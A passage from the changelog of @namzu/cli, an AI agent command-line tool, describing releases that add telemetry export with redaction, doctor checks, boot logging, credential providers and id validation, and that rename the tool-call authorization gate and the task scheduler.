  **The disclosure cannot disagree with the filter.** `describeSessionExport` names the destination, the event types, the redactor count, and whether conversation text is included — and that last one is derived from `eventTypes` rather than declared beside them. It returns a distinct sentence when export is off, because one that read the same in both states would tell a user nothing.

  In `@namzu/cli`: a `telemetry.sessionExport` config block (`destination`, `eventTypes`, `redactors`), the disclosure emitted at boot under `namzu.telemetry.status`, and a `telemetry.session-export` doctor row that names the destination and the redactor count.

  Two refusals rather than degradations. If `sessionExport` is configured and `@namzu/telemetry` is not installed, the run does not start — continuing would mean the session happens and the record the operator was counting on does not exist. And a malformed `sessionExport` block is dropped whole rather than field by field, because a mistyped `redactors` read leniently would leave export ON with redaction silently OFF; dropping it makes the boot line read "off", which is visible.

  Omitting `redactors` installs the shipped `secrets` redactor. Turning redaction off takes an explicit `[]`.

- 9b053ba: New run event `compaction_tool_results_cleared`, carrying `clearedCount`, `charsReclaimed`, `reclaimedTokens` and `reliefWasEnough`. It reaches the SSE stream as `compaction.tool_results_cleared`, the run reporter, `transcript.jsonl`, and the CLI's context line. A2A maps it to `null` alongside the other two compaction events: which of this runtime's context-relief strategies fired is a property of how it manages its own window, and a peer modelling a task lifecycle can act on none of them.

  Clearing oversized tool results is the cheapest and most common context-relief path, and it was the only one that emitted nothing. It edits the conversation irrecoverably — `tool_result` bodies are replaced in place — so a host reading a transcript saw results it no longer had and no record of why, while both summarization outcomes were already on the wire.

  It fires on **both** branches. `reliefWasEnough: false` means the clear happened, was insufficient, and a summarization followed: the history took two edits in one pass, and a reader who saw only the `compaction_completed` would attribute the whole loss to it.

- c844507: Attachments persist content-addressed, over a real `@namzu/files` driver.

  `@namzu/files` shipped six drivers and had no consumer in this repo — a package the estate could import and nothing here could point at. This is the pointing: the local driver, wired to the attachment seam the SDK added, in the one host that actually attaches things.

  Addressed by content **and media type**, not by content alone. The same bytes declared `image/png` once and `application/pdf` later are two different claims about what they are, and the SDK's resolver refuses a ref whose stored media type disagrees with the message. Keying on bytes alone would make the second `put` return the first ref, and every message using it would then be refused — a dedup that manufactures the exact mismatch the check exists to catch.

  The media type is stored in a sibling file rather than inferred, because the resolver's check needs the store to be able to _report_ what it holds: a store that could only echo back what a caller claimed could never catch a mismatch. A ref with bytes and no media type resolves to nothing rather than to a guess.

  `/skills` is now declined from the kernel rather than colliding with it. The kernel's version lists what a registry holds; this host's discovers skills from disk, marks which are active, and shows a refused one with its reason. Both are correct for their audience. `HOST_OWNED_COMMAND_NAMES` names each such case in writing — deliberately a list of exceptions rather than a precedence rule, since first-wins or last-wins would make an _accidental_ collision silent, which is what the collision error exists to prevent.

- 8e5d3f6: Add `loadConfigWithProvenance` so the config cascade records which source won each key

  `mergeConfigs` used to be `Object.assign` across `DEFAULT_CONFIG`, `~/.namzu/config.yaml`, `namzu.config.json` and the `NAMZU_*` environment scan — the last writer won and nothing recorded who it was. `loadConfigWithProvenance(opts?)` now returns `{ config, provenance }`, where `provenance` maps each key of the resolved config to a `ConfigSource`:

  - `{ kind: 'default' }`
  - `{ kind: 'user-file', path }`
  - `{ kind: 'project-file', path }`
  - `{ kind: 'env', variable }` — names the exact `NAMZU_*` variable, not just "env"

  A key that no source set is absent from `provenance` entirely — it is never fabricated as `{ kind: 'default' }`, since `DEFAULT_CONFIG` does not carry every field (`sandbox` has none today).

  `loadConfig` keeps its exact existing signature, `(opts?: LoadConfigOptions) => NamzuCliConfig` — it is now implemented as `loadConfigWithProvenance(opts).config`, so the two cannot drift apart, and no existing consumer of `loadConfig` sees any behavior change.

  New exports from `@namzu/cli`: `loadConfigWithProvenance`, `ConfigProvenance`, `ConfigSource`.

  This is groundwork for the CLI's boot narrative (`namzu.config.resolved`), which will use `provenance` to summarize where each setting came from at startup — that rendering is not part of this change.

- 6001cac: The command list is what this host owns plus whatever the kernel's registry
  reports, instead of one hardcoded array.

  `SLASH_COMMANDS` was a literal, and nothing a capability added could reach
  the operator without editing that file. The coupling had already escaped
  the TUI: two headless commands imported the array for a name list, so a
  name they did not know went to the MODEL as prose — both a wrong answer and
  a tool call nobody asked for.

  `CLI_LOCAL_COMMANDS` now holds only what this host genuinely owns — a
  transcript, a picker, a login, an expand — and `mergeHostCommands` appends
  the registry's. `/agents` and `/tasks` are the kernel's now, and
  `SlashContext.agentIds` is gone: the roster is the kernel's fact, and the
  CLI carrying a second copy meant two answers to one question that could
  disagree.

  A name claimed by both throws at merge time naming it, rather than letting
  local win quietly. One of the two would never run, which one depends on
  merge order, and neither the kernel nor the host author would ever see it.

  Dispatch is a new `SlashAction` kind rather than an async action, because
  the registry's handlers read stores and this union is synchronous — naming
  the dispatch as a result keeps that boundary where it is, and the App's
  exhaustive `never` default still fails the build for an unhandled kind.

- 4b4e039: Add a `runtime.invariants` row to `namzu doctor`

  Reads `@namzu/sdk`'s new module-attributed invariant registry (`InvariantRegistry`, NZ-BOOT-03) and reports what this build claims about its own live state: the registered set, each invariant's outcome right now, and its accumulated violation counter.

  `unknown` — a check that could not be evaluated, which is what both of the SDK's shipped invariants correctly answer outside a live run, since `namzu doctor` has no compaction pass or run claim to point them at — is reported as `inconclusive`, never `pass`. Any `violated` invariant fails the row, and a failed row fails the whole report (`exit 1`, same as any other doctor check).

  **What this means for a script that runs `namzu doctor` and checks its exit code:** on a normal machine, with no run in flight, the new row will read `inconclusive` rather than `pass`, which — per this command's existing exit-code table — moves the report's exit code to `69` unless something else already failed it to `1`. This is new for any caller that previously got `0` from a clean `namzu doctor` run outside of an active session.

  New doctor check: `invariantsCheck` (id `runtime.invariants`), added to `builtInDoctorChecks`. New export: `describeInvariants(registry)`, so a host can drive its own `InvariantRegistry` rather than the process-wide singleton.

- a660710: Extract the tri-state optional-package probe, and probe all four optional capabilities in `namzu doctor`

  `doctor/checks/telemetry.ts`'s resolve-then-import probe — the one that tells a genuinely absent `@namzu/telemetry` apart from one that is installed and throws on load — only ever covered telemetry. `@namzu/sandbox`, `@namzu/files` and `@namzu/computer-use` had no equivalent check, so a sandbox whose native binding failed to load in a container image was invisible to `namzu doctor`: nothing probed it, so nothing could report `fail`.

  New in `@namzu/cli`:

  - `probeOptionalPackage(specifier): Promise<CapabilityProbe>` — the extracted probe, at `context/capabilities.ts`. Never throws; every resolve/import failure becomes a `CapabilityProbe` value.
  - `CapabilityProbe` — `{ state: 'present', specifier, version }` (version read from the nearest `package.json` above the resolved entry file, not through a possibly-restrictive `exports` map), `{ state: 'absent', specifier }`, or `{ state: 'broken', specifier, error }`.
  - `NAMZU_OPTIONAL_CAPABILITIES` — the four optional packages namzu runs without: `@namzu/sandbox`, `@namzu/files`, `@namzu/computer-use`, `@namzu/telemetry`.
  - `probeCapabilities(): Promise<readonly CapabilityProbe[]>` — probes all four in parallel; never rejects.
  - Three new doctor checks — `sandboxInstalledCheck`, `filesInstalledCheck`, `computerUseInstalledCheck` — registered in `builtInDoctorChecks` alongside the existing `telemetryInstalledCheck`, all now built over the same probe.

  `describeInstalledPackage` and `telemetryInstalledCheck` keep their exact exported signatures and status mapping; every existing test in `doctor/checks/__tests__/telemetry.test.ts` passes unmodified. A broken optional package still reports doctor status `fail`; an absent one still reports `skipped` and leaves the doctor's exit code at `0` — `builtInDoctorChecks` gaining three checks changes no existing row and cannot move a healthy machine off exit `0`.

  One wording change, needed because `describeInstalledPackage` now backs four packages instead of one: a `broken` package's remediation text used to read "...or remove it if you are not using **telemetry**...", regardless of which specifier was actually broken. It now reads "...or remove it if you are not using **it**...". No test asserted the old literal string; a caller matching on it should switch to matching the surrounding sentence instead.

  No boot-path emission yet — the boot narrative's `capability` line consumes this probe in a follow-up change.

- f2a7375: `namzu doctor` now reports what the log pipeline did to this process's records: how many never reached the sink, how many had a credential redacted, and how many were shed or truncated by the size caps. It fails — non-zero exit — when records were dropped, and reports `inconclusive` rather than a green row when no sink was installed at all.

  New SDK export `getLogCounters(): LogSinkCounters | undefined`. `undefined` means no host claimed the process's log destination, so nothing measured those records; it is deliberately not a zeroed set, which would read as "nothing was dropped, nothing was redacted" about a process where neither was ever checked.

  `LogSinkCounters` had five fields incremented on every record and no reader anywhere. It could not have had one: the counters lived on whatever logger `createLogger` built, and `getRootLogger()` resolves per call and built a fresh one each time, so every total died with the expression that produced it. `installProcessSink` now owns one counter set per installed destination and every logger routed through it adds to those totals. A replacement install (`{ replace: true }`) starts at zero rather than carrying the previous destination's counts forward — the numbers describe the sink that is live.

  `createLogger` takes an optional second argument, a counter set to share. Omitting it is unchanged behaviour: a host that builds its own logger for one subsystem keeps its own counts unless it asks otherwise.

- b1bb2e0: Nothing stored a per-message judgment, so every consumer had to invent its
  own side table to answer the most basic question there is — was that answer
  any good.

  `MessageFeedbackStore` records a `'good' | 'bad'` rating and an optional
  note per `{ runId, messageId }`, in memory or on disk. `rating` is a closed
  union rather than a number or a free string: a 1–5 scale invites a mean
  nobody can interpret across raters, and widening the union later is now a
  deliberate major rather than an accident.

  Writes are compare-and-set on a per-record `ownerVersion`, throwing
  `StaleFeedbackError` with both the expected and the actual version. The
  disk store's first write uses an exclusive create, so two raters who each
  read "no feedback yet" cannot both land — a read-then-write is not atomic,
  and a rating is exactly the kind of value where last-write-wins loses
  information nobody notices is gone.

  A rating aimed at a `messageId` that appears in no event of the named run
  is refused with `UnknownMessageError` and nothing is written. A row
  pointing at a message nobody can find is unreviewable and
  indistinguishable from a real one. A disk store built without a run
  directory to validate against refuses every write rather than accepting
  everything it cannot check.

  Both implementations run one conformance suite, which found a real
  divergence between them the day it was written.

  In the CLI, `/feedback good|bad [note]` rates the last answer. With no
  answer yet it refuses rather than writing against a synthesized id. The
  kernel's `messageId` and `runId` now travel across the CLI's event seam,
  which previously dropped both.

- be95e43: Emit the CLI boot narrative — sandbox notice, provider chain, capability probe, config provenance and a terminal ready/refused event

  **`@namzu/sdk`**: `EVENT_NAME_ATTRIBUTE` is now re-exported from the root barrel (`packages/sdk/src/utils/log/index.ts` was missing the value re-export that let it reach a host package). This is what lets a package outside the SDK — `@namzu/cli`, here — name a boot event without duplicating the reserved key `createLogger` promotes onto `LogRecord.eventName`.

  **`@namzu/cli`**'s default stderr output changes from nothing to an info-level boot narrative on every invocation, not only `run`/`drain`/`run-stream`/the TUI — `namzu doctor`/`namzu login` now also print `namzu.boot.start` and `namzu.config.resolved` ahead of their own output, because `getContext()` is the one place any subcommand resolves logging + config. Use `--quiet` (LOG-05) to go back to warn-and-above; `NAMZU_LOG_LEVEL=silent` remains a full return to today's silence.

  The highest-value line: `ResolvedSandbox.notice`/`.unconfined` (computed on every boot, discarded until now) are emitted as `namzu.sandbox.resolved`, at `warn` specifically when nothing is confined and `info` otherwise — an operator reading default output now sees "this platform enforces none of filesystem, network, process" instead of it existing only in a field nothing read.

  Also new: `namzu.provider.resolved` (the constructed chain and each skipped fallback's reason), `namzu.capability.detected`/`.broken` (via `probeCapabilities`, gaining its first consumer and joining `@namzu/cli`'s public exports alongside the existing `probeOptionalPackage`/`CapabilityProbe`/`NAMZU_OPTIONAL_CAPABILITIES`), `namzu.discovery.completed` (MCP connectors — plugin/skill discovery is not yet wired to the boot path and is not claimed here), `namzu.telemetry.status` (states plainly that no `TracerProvider`/`LoggerProvider` is registered, since the CLI does not call `registerTelemetry()` on any path today), and the terminal `namzu.boot.ready` / `namzu.boot.refused` pair — `ready` fires exactly once on success with no boolean readiness field, `refused` fires at `error` on every early return out of `createAgentSession` including a `sandbox.requireIsolation` control this host cannot meet, which now also logs before the process exits non-zero (the exit code itself is unchanged — the existing top-level catch in `runCli` already produced it).

  The two previously-silent `catch {}` blocks in `packages/cli/src/tui/agent.ts` (a failed provider-client rebuild after an OAuth token refresh; a sub-agent runtime that failed to start) now each emit one `warn` record with `exception.type`/`exception.message`. Neither's behavior changed — both remain non-fatal.

  No exported signature changed and no default changed; every addition is either a new export or new stderr output governed by the existing `--quiet`/`--verbose`/`NAMZU_LOG_LEVEL`/`NAMZU_LOG_FORMAT` controls.

- 71ed5df: A credential turning over is now observable, and the doctor's vault check
  can answer.

  Rotation was invisible: a lapsed OAuth token was refreshed straight into
  the CLI's file store, and the bus carried `vault_lookup` with no change
  event — so no probe subscriber could see a credential replaced, and nothing
  could answer "when did this last rotate".

  `vault_credential_changed` joins the bus, dispatched through the same probe
  registry `vault_lookup` already uses rather than a second one, which would
  mean a subscriber that saw lookups and not rotations depending on which it
  found. `kind` separates `set` from `rotated`, which is the distinction a
  reader wants: a first write is configuration, a replacement is a credential
  turning over. The event carries the credential's NAME and never its value —
  a change event exists to be logged, forwarded and retained, which is
  exactly what a secret must not be.

  `FileCredentialProvider` makes the CLI's hardened store writable through
  the seam. It adds no file logic of its own: the store already owns the `wx`
  open, the `0600`, and the read-back that proves the mode landed, and a
  second copy of that guarantee is the one that would drift.

  The doctor's vault check answered `skipped` unconditionally with "no vault
  auto-discovery in v1" — the same answer on every machine, forever, which is
  the shape `a-check-that-cannot-fail` warns about. It now reports what the
  registered providers describe, and returns `skipped` only when none is
  registered. It calls `describe`, never `resolve`: this output is what an
  operator pastes into an issue.

- fec1e27: Stop silencing the CLI's own logger

  Every one of `namzu run`, `namzu drain`, `namzu run-stream` (including its `providers-json` sibling) and the interactive TUI forced the SDK logger's level to `silent` on its way into a session, and nothing anywhere in the tree ever turned it back on. That is the whole, literal reason a boot problem, a skipped provider, or a discovery failure never showed up anywhere: not a missing feature, a standing instruction to throw every diagnostic away.

  Each entry point now installs a real sink instead:

  - `run`/`drain` write pretty-printed records to stderr by default; pass `--log-format json` (or set `NAMZU_LOG_FORMAT=json`) for NDJSON.
  - `run-stream` (and `providers-json`) always write NDJSON to **stderr** — a machine-read channel distinct from stdout's own event protocol, which is untouched by any of this.
  - The interactive TUI buffers into a ring buffer instead of writing at all (Ink owns the terminal), and flushes it to stderr on a clean exit or a crash.

  New flags: `--verbose` (debug level) and `--log-format <pretty|json>`. The existing `-q`/`--quiet` now also raises the log floor to warn. New env vars: `NAMZU_LOG_LEVEL`, `NAMZU_LOG_FORMAT`. An explicit `--verbose`/`--quiet`/`--log-format` always wins over its environment-variable counterpart.

  **Default stderr output changes from nothing to info-level records.** Anyone parsing a namzu subprocess's stderr and relying on it being empty should pass `--quiet` (or set `NAMZU_LOG_LEVEL=warn`) to restore the old behaviour; stdout — every command's actual protocol — is unaffected.

### Patch Changes

- ff132b3: Running `.github/scripts/verify-consumer-install.sh` deleted every uncommitted changeset in the working tree.

  The script rewrites each package manifest to check what would PUBLISH rather than what sits in the tree, so it snapshots the version-carrying files on entry and restores them on exit. The restore does `rm -rf .changeset` and untars the snapshot back.

  The snapshot was taken with `git ls-files`, which lists TRACKED files. A changeset you have just written is by definition untracked, so it was never in the snapshot and the `rm -rf` was the last thing that happened to it — silently, by a gate `AGENTS.md` tells every contributor to run before pushing, on the one file that declares what the push is supposed to release. The comment above the restore already stated the rule this broke: a developer's uncommitted edit is not this script's to discard.

  `.changeset/` is now snapshotted from disk. The manifests keep `git ls-files`, which is the right tool for them: it finds every tracked manifest wherever a package lives, so a new package directory cannot fall outside the snapshot.

  A regression test in `scripts/__tests__/` drives the round trip with one committed and one uncommitted changeset — the distinction the defect turned on — and asserts the script no longer reaches for `git ls-files` on that path. `pnpm test:scripts` now runs every file in that directory rather than one named file, so the next test added there is not silently unrun.

- dd170fe: A default-level start is readable again, and a misplaced global flag says where
  it goes.

  `ManagedRegistry.register` logged at `info`, once per item, and a CLI run
  registers dozens — every builtin tool, every agent, every task tool. Turning
  the logger back on therefore replaced silence with twenty lines of
  `Registered: read`, `Registered: write` ahead of anything an operator could act
  on. Registration is the startup path working; it belongs at `debug`. The
  overwrite case stays at `warn`, because a second registration under a live id
  is news.

  `namzu run "…" --verbose` was answered with "pass `--` before a prompt that
  starts with a dash" — advice about a prompt beginning with `-`, which sends the
  reader to the wrong half of their command line. `--verbose`, `--quiet`,
  `--log-format` and `--format` are program options, accepted before the command
  name, and the refusal now says exactly that and shows the position.

  Both were found by running the CLI against a real provider. Every unit test in
  these paths asserts against a logger stub or passes flags in the position that
  already worked, so neither was visible to any of them.

- 7aaa35d: Strings that were asserted into ids now go through the checked constructors, and three defects the assertions were hiding are fixed.

  **A docker sandbox's id had the wrong prefix.** `SandboxId` is `` `sbx_${string}` ``; `@namzu/sandbox`'s docker backend minted `sandbox_...` and an `as SandboxId` was the only reason that compiled. Every docker sandbox in the tree carried an id its own type says is impossible — the ACI backend already minted `sbx_`. Both now mint through `asSandboxId`, which is the call that would have caught it. **The container name derives from this** (`namzu-sandbox-${id}`), so a container started by this release is named differently from one an older build started. Nothing matches on the old spelling — teardown computes the name from the id it just minted, in the same process — but it is visible in `docker ps`, and any external tooling that pattern-matched `namzu-sandbox-sandbox_` needs updating.

  **A corrupt migration marker was honoured instead of refused.** `readMarker`'s shape check validated the envelope — `version`, `at`, and that `migratedThreads` is an array — and never looked inside the array. `{"migratedThreads":[null]}` therefore parsed cleanly and produced an entry whose `newProjectId` was `undefined` wearing a `ProjectId` annotation, which then reached a path join. Each element is now checked, and a bad one returns `null` — which is exactly what this function already promised to do about corruption, so the caller re-runs the migration rather than trusting it.

  **`namzu drain` accepted a mistyped scope flag.** `--tenant`, `--project` and `--session` were asserted straight into their id types, so `--tenant prj_a` reached the store and listed nothing — and "no runs" is the same output as a scope that really is empty, which made the typo invisible. Each flag is now prefix-checked, and the refusal names the prefix it wanted, in the same operator-readable shape the command's other refusals use.

  **Model-authored ids are checked before they become store keys.** `read_memory`, `task_update` and the RAG tool took an id straight from the model's tool input and asserted it. A malformed one read back as "not found", telling the model its record had disappeared rather than that it named the wrong thing. All three now refuse with `InvalidIdError`, whose message says which prefix was expected.

  Nothing here changes an exported type, a signature or a default. Sites where a cast is still correct — a value already guarded by an explicit prefix check, an id minted by a service outside this repo, a sentinel the type cannot express — keep the cast and now carry the reason next to it.

- ab80de5: `namzu doctor` reported installed optional packages as missing. `@namzu/files` and `@namzu/telemetry` both read "not installed (optional package)" on machines where they were installed and working, and the boot narrative's capability line said the same.

  `probeOptionalPackage` asked `require.resolve` whether a package was on disk. That is not the question it answers: it answers whether CJS may load the package's entry point, and every optional package here is ESM-only with an `exports` map that declares `import` and no `default`, so the resolver correctly throws `ERR_PACKAGE_PATH_NOT_EXPORTED`. The probe read that throw as `absent`.

  `@namzu/sdk` is what hid it. Its exports map carries a `default` condition, so it was the one specifier in the tree that resolved — anybody spot-checking the probe against it saw the right answer.

  The probe now walks `node_modules` upward for `<specifier>/package.json`, which is resolver-agnostic and is what "installed" means. `import.meta.resolve` would also have been correct and is not available under the test runner's module transform, so a probe built on it could not have been held by the tests that are supposed to hold it.

  The existing tests all drove an absolute fixture path, because there is no way to uninstall a real package inside a test run — so none of them reached the bare-specifier branch where the defect lived. Two regression tests now do, one in each direction.

  `telemetry.sessionExport` resolves `@namzu/telemetry` through this same probe rather than a second copy, so it inherits the fix and cannot drift from what the doctor reports.

- 940f52b: `CredentialProvider` is a seam a host can implement to say where a
  credential comes from, with `EnvCredentialProvider` shipped in the box.

  Every LLM-provider credential lookup lived in `@namzu/cli`, which walks its
  own provider registry and reads `process.env` directly. A host embedding the
  SDK alone had no way to plug in an env- or file-backed source short of
  reimplementing `CredentialVault` — a connector-scoped interface that asks a
  different question, holds a whole `AuthConfig` per connector, and has one
  in-process implementation with no notion of writability.

  `describe()` never carries the value. "Does this exist" is asked in places a
  secret must not travel to — a doctor readout, a picker, a log line — and a
  description that carried one would leak on every one of them while looking
  like metadata.

  `EnvCredentialProvider` is read-only and says so: `set` and `unset` throw a
  named error pointing at a writable alternative, rather than accepting a
  write and dropping it. A `set` on `process.env` changes one map in one
  process and vanishes with it, while the caller is told it worked.

  The credential key-name vocabulary moves to `constants/credential-env-keys.ts`,
  a leaf with no imports beside `secret-patterns.ts` — that file matches
  credential VALUES, this one the names they are carried under. The host-bash
  environment scrub and the credential seam now read the same table, and
  `isCredentialEnvKey` is exported so a host with its own provider registry can
  assert its variables are ones the scrub will withhold. A name in one table
  and not the other means a variable the CLI reads an API key from and the
  scrub hands to a shell command.

  CLI discovery goes through the seam with identical results.

- 982f0dd: The TUI's local `exceptionAttributes` helper (`packages/cli/src/tui/agent.ts`) is now typed to return `LogAttributes` instead of a bare `Record<string, string>`. The two keys it has always produced (`exception.type`, `exception.message`) already match the namespace pattern, so this is a type-level narrowing with no behavior change — it exists so `scripts/check-log-standard.mjs`'s new namespaced-attribute-key rule can prove the call sites that pass this helper's result to a `Logger` are compliant by type, rather than leaving them as three more entries in that rule's ratchet count.

  No public API change: `exceptionAttributes` is a module-private function, never exported.

- 6e11fd7: Every diagnostic these two packages emit now has a constant message body, and the identifiers that used to be interpolated into it are attributes beside it.

  87 `Logger` call sites across 29 files were rewritten. `` `Tool execution error: ${toolName}` `` is now `'Tool execution error'` with `namzu.tool.name` in the attribute bag; `` `Tenant registered: ${id} (${name})` `` is now `'Tenant registered'` with `namzu.tenant.id` and `namzu.tenant.name`. Where the neighbouring bag already carried the value, only the message changed; where it did not, the value moved into a new `namzu.*` key in the same edit — a constant body that costs an operator the identifier would be a worse record, not a compliant one.

  **If you grep, alert on, or group by these message bodies, your queries need updating.** No exported type, signature or default changed, and nothing fails to compile — this is diagnostic output, not API — but a log pipeline matching the old interpolated text will stop matching. The upside is the reason for the change: an operator can now grep one literal for every occurrence of an event, and a dashboard can group by it, neither of which was possible when each occurrence rendered a different string.

  `scripts/check-log-standard.mjs`'s rule-3 ratchet (`constantBodyViolationCount`) goes 87 → 0. At zero it stops being a budget and becomes a floor: the _first_ new template literal in a `Logger` call fails CI, not the hundredth. Rule 4 (`namespacedAttributeKeyViolationCount`) is unchanged at 794 and still being worked down.

- 62773b8: `TaskGateway` becomes `TaskScheduler` and `LocalTaskGateway` becomes
  `LocalTaskScheduler`. Old names still work and are marked `@deprecated`;
  they go in the next major.

  "Gateway" names an object that sits at a system boundary and faces outward
  — Fowler's POEAA Gateway, an API gateway, a payment gateway. This one faces
  inward: it creates, waits on, continues, cancels and lists in-process agent
  tasks. A reader who trusted the name expected a facade over something
  external and found a scheduler.

  Two config fields move with the types, because the field name is what a
  host actually types and leaving one spelled `gateway` would retire the type
  while keeping its vocabulary:

  - `QueryParams.taskGateway` → `QueryParams.taskScheduler`
  - `SupervisorAgentConfig.gateway` → `SupervisorAgentConfig.scheduler`

  Both accept either spelling for the window. Setting both to different
  instances throws and names both fields; setting both to the same instance
  is fine. The supervisor resolves the pair once rather than at each read, so
  a host that sets only the new name cannot get a working scheduler on one
  path and `undefined` on another.

  `SupervisorAgentConfig` with neither a scheduler nor an `agentManager` is
  still an error, and the message now names `scheduler`.

- 6f4cd04: The verification gate is an authorization gate, and is named one. Old names
  still work and are marked `@deprecated`; they go in the next major.

  | Old                               | New                       |
  | --------------------------------- | ------------------------- |
  | `VerificationGate`                | `AuthorizationGate`       |
  | `VerificationRule`                | `AuthorizationRule`       |
  | `VerificationGateConfig`          | `AuthorizationGateConfig` |
  | `verificationGate` (config field) | `authorizationGate`       |

  A reader who saw `VerificationGate` expected something that verifies a claim
  — checks a signature, confirms an output matches a schema. It is a rule
  engine that decides, before a tool runs, whether the call is permitted:
  allow, deny or review, by name, category, tier, or a pattern over the
  arguments. Every rule variant already said so. The misreading was not
  academic: the module sat beside real guardrail and HITL neighbours, where
  "verification" suggests exactly the post-hoc double-check the guardrails do.

  The config field is on `ReactiveAgentConfig`, `SupervisorAgentConfig`,
  `runAgent`'s options and `QueryParams`. Both spellings are accepted for the
  window and resolved at one site; setting both to different configs throws
  and names both fields. One resolve rather than four matters more here than
  for an ordinary rename — a gate present on one path and absent on another
  means a tool call permitted where it should have been refused.

  Also renamed, and reachable only in type position: `VerificationRuleSchema`
  and `VerificationGateConfigSchema`. They are not exported as values, but
  `import type` and `typeof` both worked, so they carry aliases rather than
  disappearing.

  Deliberately unchanged, because each is already correct about what it is:
  `GateDecision`, `GateEvaluationResult`, `ToolCallContext`, `describeRule`,
  `evaluateRule`, `defaultSandboxedGateConfig`,
  `defaultSandboxedShellGateConfig`.

  The module-invariant registry — `createInvariantRegistry`, `invariants`,
  `InvariantRegistry` and friends — moved to its own directory rather than
  into `authorization/`. It is the one thing in the old `verification/` that
  genuinely verifies a claim: what a module says about its own live state. No
  import path changes for consumers; it is exported from the same barrel.

- ad98269: Tools now decide how their calls and results are shown, and the CLI stopped
  matching on tool names.

  `write` gains `presentCall`, returning a diff with an empty `before` —
  which is what a write is: whatever was there is gone and this replaces it.
  `edit` and `write` both gain `presentResult` returning a plain label, which
  is what suppresses the detail block: the content was already shown under
  the call, and repeating it doubles the longest rows in a transcript to say
  nothing new. That decision used to be a host matching two names.

  `createToolPresenter`'s result fallback changed from a `generic` view
  truncated to 120 characters to a `terminal` view carrying the whole output.
  A host renders a result across many rows and decides for itself how many
  fit — that is a property of its terminal, not of the tool — and truncating
  in the kernel destroyed text no host could then recover. A tool that wants
  the one-line form returns a `generic` view itself.

  In the CLI this deletes `summarizeToolInput`, `previewToolInput`,
  `toolStartDetail` and `toolEndDetail`, replacing four name-matching
  functions with one `viewToLines`. A tool the CLI has never heard of — an
  MCP server's, a plugin's — now gets a diff if it asks for one, where before
  it got a truncated JSON blob no matter what it did.

- 50c0f29: `Topic` becomes the primary name for the container between Project and Session.
  Every exported `Thread*` name keeps working as a `@deprecated` alias.

  The layer has always been a topic — its own docstring calls it a "Topic-level
  container" — and `Thread` is the one word in this kernel's OS vocabulary that
  already means something specific and different, for a thing that has no
  execution and no state machine of its own.

  Renamed, with identity aliases on the public surface: `TopicManager` /
  `ThreadManager`, `InMemoryTopicStore` / `InMemoryThreadStore`,
  `generateTopicId` / `generateThreadId`. `TopicId` is a type alias to the
  unchanged `ThreadId`; both are still `` `thd_${string}` `` this release.

  **Not in this release**, and deliberately: the `thd_` prefix itself, the
  `threadId` field on persisted records, and `acceptLegacyThreadId` /
  `rejectLegacyPrefix`. The last two belong to a DIFFERENT `thd_` — the
  pre-0.2.0 top-level container the migration coerces to `prj_legacy_*` — and
  merging the two meanings is the confusion this chain exists to end. The prefix
  and the field each carry a data migration and land separately.

- Updated dependencies [9914794]
- Updated dependencies [3939dc9]
- Updated dependencies [f05a0f1]
- Updated dependencies [d7d38a3]
- Updated dependencies [f12284a]
- Updated dependencies [19a72ff]
- Updated dependencies [5136fbd]
- Updated dependencies [966c6de]
- Updated dependencies [eff96ac]
- Updated dependencies [70f8d75]
- Updated dependencies [dd170fe]
- Updated dependencies [b947794]
- Updated dependencies [5d23bf4]
- Updated dependencies [5f5becd]
- Updated dependencies [94842e4]
- Updated dependencies [9b15964]
- Updated dependencies [d54fe08]
- Updated dependencies [655cc9d]
- Updated dependencies [1e996bc]
- Updated dependencies [13b2682]
- Updated dependencies [be7152b]
- Updated dependencies [2928057]
- Updated dependencies [c2663c2]
- Updated dependencies [014da58]
- Updated dependencies [4edf2c6]
- Updated dependencies [7aaa35d]
- Updated dependencies [cb1a487]
- Updated dependencies [af47721]
- Updated dependencies [ee7856e]
- Updated dependencies [3331493]
- Updated dependencies [7015eee]
- Updated dependencies [83b5f83]
- Updated dependencies [30029bd]
- Updated dependencies [9b053ba]
- Updated dependencies [44b5c76]
- Updated dependencies [ae09a42]
- Updated dependencies [bab1e02]
- Updated dependencies [47437f6]
- Updated dependencies [b01068a]
- Updated dependencies [940f52b]
- Updated dependencies [ead7703]
- Updated dependencies [e45699e]
- Updated dependencies [17ba31f]
- Updated dependencies [c968b58]
- Updated dependencies [40932a1]
- Updated dependencies [320322d]
- Updated dependencies [7507e33]
- Updated dependencies [779d62a]
- Updated dependencies [75c5b4a]
- Updated dependencies [0dbf62f]
- Updated dependencies [28cbe6d]
- Updated dependencies [f8f0004]
- Updated dependencies [f2a7375]
- Updated dependencies [7015eee]
- Updated dependencies [b395a1e]
- Updated dependencies [43358a1]
- Updated dependencies [6e11fd7]
- Updated dependencies [ca97021]
- Updated dependencies [9947662]
- Updated dependencies [89dfe84]
- Updated dependencies [8a4986f]
- Updated dependencies [b1bb2e0]
- Updated dependencies [79ed788]
- Updated dependencies [da66613]
- Updated dependencies [ec15971]
- Updated dependencies [be95e43]
- Updated dependencies [c166029]
- Updated dependencies [a093e22]
- Updated dependencies [01684bf]
- Updated dependencies [71939c1]
- Updated dependencies [e010634]
- Updated dependencies [9aba59a]
- Updated dependencies [5a4f7b4]
- Updated dependencies [7adf919]
- Updated dependencies [70f23bb]
- Updated dependencies [413d939]
- Updated dependencies [1d428e6]
- Updated dependencies [f9c1589]
- Updated dependencies [fad5da4]
- Updated dependencies [4992819]
- Updated dependencies [215f7b5]
- Updated dependencies [62773b8]
- Updated dependencies [6f4cd04]
- Updated dependencies [71ed5df]
- Updated dependencies [b7f7897]
- Updated dependencies [dec1964]
- Updated dependencies [e5dde44]
- Updated dependencies [8053dc1]
- Updated dependencies [9142405]
- Updated dependencies [4ccf9e3]
- Updated dependencies [f94ca7d]
- Updated dependencies [2df8cd2]
- Updated dependencies [f9833ab]
- Updated dependencies [4abc5ee]
- Updated dependencies [cf48cef]
- Updated dependencies [9bce045]
- Updated dependencies [2ccbd7b]
- Updated dependencies [f2a1dd9]
- Updated dependencies [1460a02]
- Updated dependencies [ad98269]
- Updated dependencies [50c0f29]
- Updated dependencies [c665956]
- Updated dependencies [70e3163]
- Updated dependencies [5f8a8c5]
- Updated dependencies [5ed3b03]
- Updated dependencies [9d6c482]
  - @namzu/sdk@28.0.0
  - @namzu/openai@1.2.1
  - @namzu/anthropic@3.3.1
  - @namzu/openrouter@2.2.0
  - @namzu/files@1.0.0
  - @namzu/ollama@2.1.0

## 11.0.0

### Major Changes

- ee70817: A connected server no longer decides whether its own tool calls need approval

